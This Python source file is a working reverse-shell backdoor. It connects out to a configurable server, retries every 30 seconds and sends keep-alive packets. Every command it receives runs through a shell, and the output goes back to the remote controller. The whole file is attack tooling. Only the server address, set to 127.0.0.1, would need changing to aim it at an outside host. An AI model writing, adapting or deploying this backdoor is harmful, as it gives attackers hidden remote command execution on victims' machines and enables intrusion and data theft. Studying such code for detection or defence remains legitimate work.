#!/usr/bin/env python
import os
import subprocess
import time

from threading import Thread
from multiprocessing import Queue
from socket import *

#  Static variable
SERVER = "127.0.0.1"
PORT = 9044
DEFAULT_DELAY = 30
DEFAULT_SOCKET_RECV_TIMEOUT = 4
BUFSIZE = 4096


class Command(object):
    def __init__(self, cmdstr, sock):
        self.cmdstr = cmdstr
        self.stdout, self.stderr = self._execute()

    def _execute(self):
        """
        Executes the command and return its output.
        :return: tuple (stdout, stderr)
        """
        proc = subprocess.Popen(self.cmdstr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        #  print("[+] Started process of command '{0}'".format(self.cmdstr))
        stdout, stderr = proc.communicate(timeout=DEFAULT_DELAY)
        #  print("[+] Bytes of stdout: {0}, Bytes of stderr: {1}".format(len(stdout), len(stderr)))
        return stdout, stderr


class BackConn(object):
    def __init__(self):
        self.sock = None
        self.target = (SERVER, PORT)
        self.conn_status = False
        self.conn_pulse = 0

    def _keep_alive(self):
        keep_alive_data = '\00\00'.encode()
        if not self.sock:
            return 0
        self.sock.send(keep_alive_data)
        self.conn_pulse = 0

    def _transaction(self):
        """
        Manage the TCP connection and keep the connection alive.
        """
        while self.conn_status is True:
            try:
                data = self.sock.recv(BUFSIZE)
                #  This checks if socket is still open.
                if not data:
                    self.conn_status = False
                else:
                    self.conn_pulse = 0
            except timeout:
                #  print("[Debug] Receive function timeout achieved.")
                data = None
                self.conn_pulse += 1
                pass
            except Exception as e:
                print("[!] Error: {0}".format(e))
                pass

            #  Send keep alive data
            if self.conn_pulse > 4 and data is None:
                #  print("[Debug] Sending keep-alive data ...")
                self._keep_alive()

            #  Execute the data if it exists;
            if data is not None and len(data) > 0:
                #  print("[Debug] Trying to execute '{0}'".format(data.decode()))
                c = Command(data.decode(), self.sock)
                self.sock.sendall(c.stdout)


    def start(self):
        i = 0
        while self.conn_status is False:
            i += 1
            print("[TCP session #{0}]".format(i))
            #  Establish the connection
            try:
                self.sock = socket(AF_INET, SOCK_STREAM)
                self.sock.settimeout(DEFAULT_SOCKET_RECV_TIMEOUT)
                self.sock.connect(self.target)
                self.conn_status = True
                print("[+] Connection has been established. | Timeout: {0}".format(self.sock.gettimeout()))
                self._transaction()
                #print("[!] Transaction ended.")
            except Exception as e:
                print("[!] Error: Could not connect to host {0}".format(SERVER))
                print("[Error message] {0}".format(e))
            time.sleep(DEFAULT_DELAY)

        print("[*] Connection terminating ...")
        return 0



def main():
    backdoor = BackConn()
    conn_thrd = Thread(target=backdoor.start, args=())
    conn_thrd.start()
    conn_thrd.join()
    return 0


if __name__ == "__main__":
    main()
